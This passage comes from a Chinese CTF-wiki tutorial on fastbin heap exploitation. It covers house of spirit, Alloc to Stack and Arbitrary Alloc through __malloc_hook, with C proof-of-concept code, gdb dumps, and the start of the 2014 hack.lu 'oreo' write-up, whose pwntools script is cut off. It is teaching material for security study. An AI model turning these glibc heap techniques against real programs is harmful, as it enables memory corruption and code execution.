<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
</div>
<div class="section" id="id7">
<h3>演示<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
<p>这里就直接以 how2heap 上的例子进行说明，如下</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;stdlib.h&gt;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;This file demonstrates the house of spirit attack.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
    <span class="o">//</span> <span class="n">This</span> <span class="n">has</span> <span class="n">nothing</span> <span class="n">to</span> <span class="n">do</span> <span class="k">with</span> <span class="n">fastbinsY</span> <span class="p">(</span><span class="n">do</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">fooled</span> <span class="n">by</span> <span class="n">the</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="n">fake_chunks</span> <span class="ow">is</span> <span class="n">just</span> <span class="n">a</span> <span class="n">piece</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">to</span> <span class="n">fulfil</span> <span class="n">allocations</span> <span class="p">(</span><span class="n">pointed</span> <span class="n">to</span> <span class="kn">from</span> <span class="nn">fastbinsY</span><span class="p">)</span>
    <span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">16</span><span class="p">)));</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;This region (memory of length: </span><span class="si">%lu</span><span class="s2">) contains two chunks. The first starts at %p and the second at %p.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">fake_chunks</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="o">//</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">size</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
        <span class="o">//</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="n">because</span> <span class="mh">0x40</span> <span class="o">/</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span> <span class="o">//</span> <span class="n">nextsize</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>
</div>
<p>运行后的效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  how2heap git:(master) ./house_of_spirit
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
malloc(0x30): 0x7ffd9bceaa60
</pre></div>
</div>
</div>
<div class="section" id="id8">
<h3>小总结<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
<p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p>
</div>
</div>
<div class="section" id="alloc-to-stack">
<h2>Alloc to Stack<a class="headerlink" href="#alloc-to-stack" title="永久链接至标题">¶</a></h2>
<div class="section" id="id9">
<h3>介绍<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
<p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p>
<p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
</div>
<div class="section" id="id10">
<h3>演示<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">typedef</span> <span class="n">struct</span> <span class="n">_chunk</span>
<span class="p">{</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">pre_size</span><span class="p">;</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">fd</span><span class="p">;</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">bk</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CHUNK</span><span class="p">,</span><span class="o">*</span><span class="n">PCHUNK</span><span class="p">;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">CHUNK</span> <span class="n">stack_chunk</span><span class="p">;</span>

    <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">;</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk_a</span><span class="p">;</span>

    <span class="n">stack_chunk</span><span class="o">.</span><span class="n">size</span><span class="o">=</span><span class="mh">0x21</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>

    <span class="o">*</span><span class="p">(</span><span class="n">long</span> <span class="n">long</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk1</span><span class="o">=&amp;</span><span class="n">stack_chunk</span><span class="p">;</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk_a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000021</span> <span class="o">&lt;===</span> <span class="n">chunk1</span>
<span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x00007fffffffde60</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020fe1</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
</pre></div>
</div>
<p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0x0000000000000000</span> <span class="o">&lt;===</span> <span class="n">unsorted</span> <span class="nb">bin</span>
<span class="mh">0x7ffff7dd1b28</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>  <span class="mh">0x00007fffffffde60</span> <span class="o">&lt;===</span> <span class="n">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="mh">0x7ffff7dd1b30</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>
</pre></div>
</div>
<p>最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;
 → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</pre></div>
</div>
</div>
<div class="section" id="id11">
<h3>小总结<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p>
</div>
</div>
<div class="section" id="arbitrary-alloc">
<h2>Arbitrary Alloc<a class="headerlink" href="#arbitrary-alloc" title="永久链接至标题">¶</a></h2>
<div class="section" id="id12">
<h3>介绍<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
<p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk
分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
</div>
<div class="section" id="id13">
<h3>演示<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
<p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。</strong></p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="p">{</span>


    <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">;</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk_a</span><span class="p">;</span>

    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>

    <span class="o">*</span><span class="p">(</span><span class="n">long</span> <span class="n">long</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk1</span><span class="o">=</span><span class="mh">0x7ffff7dd1b05</span><span class="p">;</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
    <span class="n">chunk_a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>这里的0x7ffff7dd1b05是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1a88</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1a90</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1a98</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1aa0</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1aa8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ab0</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ab8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ac0</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ac8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ad0</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ad8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ae0</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1ae8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1af0</span> <span class="mh">0x60</span> <span class="mh">0x2</span> <span class="mh">0xdd</span> <span class="mh">0xf7</span> <span class="mh">0xff</span> <span class="mh">0x7f</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1af8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1b00</span> <span class="mh">0x20</span> <span class="mh">0x2e</span> <span class="mh">0xa9</span> <span class="mh">0xf7</span> <span class="mh">0xff</span> <span class="mh">0x7f</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1b08</span> <span class="mh">0x0</span>  <span class="mh">0x2a</span> <span class="mh">0xa9</span> <span class="mh">0xf7</span> <span class="mh">0xff</span> <span class="mh">0x7f</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1b10</span> <span class="o">&lt;</span><span class="n">__malloc_hook</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x30</span>    <span class="mh">0x28</span>    <span class="mh">0xa9</span>    <span class="mh">0xf7</span>    <span class="mh">0xff</span>    <span class="mh">0x7f</span>    <span class="mh">0x0</span> <span class="mh">0x0</span>
</pre></div>
</div>
<p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
</pre></div>
</div>
<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1af0</span> <span class="mh">0x60</span> <span class="mh">0x2</span> <span class="mh">0xdd</span> <span class="mh">0xf7</span> <span class="mh">0xff</span> <span class="mh">0x7f</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
<span class="mh">0x7ffff7dd1af8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>

<span class="mh">0x7ffff7dd1af5</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">309</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x000000000000007f</span>
</pre></div>
</div>
<p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span>##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
</pre></div>
</div>
<p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x00007ffff7dd1b15，因此我们就可以直接控制 __malloc_hook的内容。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
 →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x00007ffff7dd1b15

0x7ffff7dd1b05 &lt;__memalign_hook+5&gt;: 0xfff7a92a0000007f  0x000000000000007f
0x7ffff7dd1b15 &lt;__malloc_hook+5&gt;:   0x0000000000000000  0x0000000000000000
0x7ffff7dd1b25 &lt;main_arena+5&gt;:  0x0000000000000000  0x0000000000000000
0x7ffff7dd1b35 &lt;main_arena+21&gt;: 0x0000000000000000  0x0000000000000000
</pre></div>
</div>
</div>
<div class="section" id="id14">
<h3>小总结<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
<p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>
</div>
</div>
<div class="section" id="hack-lu-oreo">
<h2>2014 hack.lu oreo<a class="headerlink" href="#hack-lu-oreo" title="永久链接至标题">¶</a></h2>
<div class="section" id="id15">
<h3>基本分析<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2014_Hack.lu_oreo git:(master) file oreo
oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
➜  2014_Hack.lu_oreo git:(master) checksec oreo
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo&#39;
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre></div>
</div>
<p>可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。</p>
</div>
<div class="section" id="id16">
<h3>基本功能<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
<p><strong>需要注意的是，该程序并没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。</strong></p>
<p>正如程序中直接输出的信息，程序主要是一个原始的在线枪支系统。其中，根据添加枪支的过程，我们可以得到枪支的基本结构如下</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span>00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
00000000 descript        db 25 dup(?)
00000019 name            db 27 dup(?)
00000034 next            dd ?                    ; offset
00000038 rifle           ends
</pre></div>
</div>
<p>程序的基本功能如下</p>
<ul class="simple">
<li>添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27
大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。</li>
<li>展示添加枪支，即从头到尾输出枪支的描述与名字。</li>
<li>订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。</li>
<li>留下订货消息</li>
<li>展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。</li>
</ul>
<p>不难分析得到，程序的漏洞主要存在于添加枪支时的堆溢出漏洞。</p>
</div>
<div class="section" id="id17">
<h3>利用<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
<p>基本利用思路如下</p>
<ol class="arabic simple">
<li>由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next
指针为 NULL。这里我采用 <a class="reference external" href="mailto:puts&#37;&#52;&#48;got">puts<span>&#64;</span>got</a>。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。</li>
<li>由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 <code class="docutils literal"><span class="pre">house</span> <span class="pre">of</span> <span class="pre">sprit</span></code> 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为
0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。</li>
<li>在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。</li>
</ol>
<p>具体代码如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./oreo&quot;</span>
